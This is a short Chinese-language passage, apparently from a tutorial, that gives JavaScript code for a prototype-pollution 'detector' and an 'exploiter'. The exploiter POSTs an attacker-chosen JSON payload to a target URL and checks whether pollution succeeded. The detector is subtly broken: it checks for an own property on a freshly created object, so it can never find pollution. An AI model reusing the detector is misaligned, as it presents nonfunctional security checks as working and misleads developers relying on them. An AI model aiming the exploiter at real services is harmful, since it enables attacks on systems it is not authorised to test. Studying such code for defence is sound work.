## 🧾 五、关键代码示例（Detector + Exploiter）

### 1. 检测逻辑（detector.js）

```javascript
function detectPrototypePollution(targetObj) {
  const originalPrototype = Object.prototype;
  const originalHasOwnProperty = Object.prototype.hasOwnProperty;

  const testObj = {};
  testObj.__proto__ = targetObj;

  // 检查是否被污染
  const isPolluted = originalHasOwnProperty.call(testObj, 'polluted');
  const isConstructorModified = originalHasOwnProperty.call(testObj, 'constructor');

  return {
    isPolluted,
    isConstructorModified
  };
}
```

### 2. 利用逻辑（exploiter.js）

```javascript
async function exploitPrototypePollution(url, payload) {
  const res = await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
  });

  const data = await res.json();

  // 检查是否成功污染
  const isPolluted = Object.prototype.hasOwnProperty.call(data, 'polluted');
  return isPolluted;
}
```

